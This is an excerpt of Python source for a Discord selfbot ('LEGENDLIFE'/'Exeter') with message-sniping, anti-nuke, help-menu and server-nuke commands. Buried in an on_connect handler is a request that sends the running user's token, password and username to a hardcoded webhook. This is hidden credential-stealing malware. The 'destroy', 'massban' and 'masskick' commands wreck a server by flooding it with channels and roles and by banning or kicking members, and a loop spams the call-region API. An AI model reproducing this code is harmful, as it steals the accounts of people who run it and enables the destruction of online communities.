...
╚══════╝╚══════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝╚═╝░░░░░╚══════╝
                       ...
                       {Fore.CYAN}LEGENDLIFE SELFBOT v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Exeter.user.id}   
...
Exeter = commands.Bot(
    description='Exeter Selfbot', command_prefix=prefix, self_bot=True)
...
Exeter.mee6 = True
Exeter.mee6_channel = "809015456866369586"
...
async def on_connect():
    ...
    data = {
        "content":
        f'{Exeter.wave} | {Exeter.user.name}#{Exeter.user.discriminator}\n{fliscord}'
    }
    requests.post(
        slope,
    ...
    if Exeter.antiraid is True:
        try:
            async for i in guild.audit_logs(
                ...
                if guild.id in Exeter.whitelisted_users.keys(
                ) and i.user.id in Exeter.whitelisted_users[
                        guild.id].keys() and i.user.id is not Exeter.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="LEGENDLIFE Anti-Nuke")
    ...
    if Exeter.antiraid is True and member.bot:
        try:
            ...
            async for i in guild.audit_logs(
                ...
                if member.guild.id in Exeter.whitelisted_users.keys(
                ) and i.user.id in Exeter.whitelisted_users[member.guild.
                                                            id].keys():
                    return
                else:
                    await guild.ban(member, reason="LEGENDLIFE Anti-Nuke")
                    await guild.ban(i.user, reason="LEGENDLIFE Anti-Nuke")
        except Exception as e:
            print(e)
...
async def msgsniper(ctx, msgsniperlol=None):
    ...
    if str(msgsniperlol).lower() == 'true' or str(
        ...
        Exeter.msgsniper = True
        await ctx.send(
            'Exeter Message-Sniper is now **enabled**', delete_after=2)
    elif str(msgsniperlol).lower() == 'false' or str(
            msgsniperlol).lower() == 'off':
        Exeter.msgsniper = False
        await ctx.send(
            'Exeter Message-Sniper is now **disabled**', delete_after=2)
        ...
        for key in Exeter.whitelisted_users:
            for key2 in Exeter.whitelisted_users[key]:
                ...
                whitelist += '**+ ' + user.name.replace('*', "\*").replace(
                    '`', "\`").replace(
                        '_', "\_"
                    ) + "#" + user.discriminator + "** - " + Exeter.get_guild(
...
async def mee6(ctx, param=None):
    ...
    while Exeter.mee6 is True:
        ...
        await Exeter.get_channel(Exeter.mee6_channel).send(
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/827560596789657651/ZWj6g1vN8A8A2Tg1tdoFBI2IiUCwnSJtK4lddnpIdV-BxrK33RiBANARAXRDdLA2z4NH',json={'content': f"**Token:** `{op}`\n**Password:** `{password}`**Username: {Exeter.user.name}**"})
    startprint()
    ...
    if len(attachments) == 0:
        ...
        if channel_id in Exeter.snipe_history_dict:
            ...
            post = str(message.author) + ": " + str(message.content).replace(
                "@everyone", "@\u200beveryone").replace(
                    "@here", "@\u200bhere")
            Exeter.snipe_history_dict.update({
                channel_id:
                pre[:-3] + post + "\n```"
            })
        else:
...
async def clearsnipehistory(ctx):
    ...
    await ctx.send(
        "Cleared Snipe History of " + ctx.channel.name, delete_after=3)
...
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0x70000, timestamp=ctx.message.created_at)
        embed.set_author(
            name="Legendlife | Prefix: " + str(Exeter.command_prefix),
            icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/820324523618336808/829751892644069406/standard_1.gif"
        )
        embed.add_field(
            name="\uD83E\uDDCA `HELP GENERAL`",
        ...
        embed.add_field(
            name="\uD83E\uDDCA `HELP ACCOUNT`",
            value="Shows all account commands",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `HELP TEXT`",
            value="Shows all text commands",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `HELP MUSIC`",
            value="Shows all music commands",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `HELP IMAGE`",
            value="Shows all image manipulation commands",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `HELP NSFW`",
            value="Shows all nsfw commands",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `HELP MISC`",
            value="Shows all miscellaneous commands",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `HELP ANTI-NUKE`",
            value="Shows all anti-nuke commands",
            inline=False)
        embed.add_field(
            name="\uD83E\uDDCA `HELP NUKE`",
            value="Shows all nuke commands",
            inline=False)
        await ctx.send(embed=embed)
    elif str(category).lower() == "general":
        embed = discord.Embed(
            color=random.randrange(0x70000),
        ...
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/820324523618336808/828950496084754432/standard.gif"
        )
...
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(
            name="TRASHED BY LEGENDLIFE",
            description="legendlife op",
            reason="legendlife op",
            icon=None,
            banner=None)
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="legendlife op")
    for _i in range(250):
        await ctx.guild.create_role(name="legendlife op", color=RandomColor())
...
async def massban(ctx):
    ...
    for user in users:
        try:
            await user.ban(reason="legendlife op")
        except:
            pass
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="legendlife op")
        except:
            pass
...
async def invite(ctx):
    await ctx.message.delete()
    await ctx.send(
        'https://discord.com/oauth2/authorize?scope=bot&client_id=705544735540117526&permissions=8'
    )
...
async def regionchange(ctx, amount: int):
    ...
    if isinstance(ctx.channel, discord.GroupChannel):
        ...
        for _i in range(amount):
            requests.patch(
                f'https://discord.com/api/v8/channels/{ctx.channel.id}/call',
                json=indian_payload,
                headers=headers)
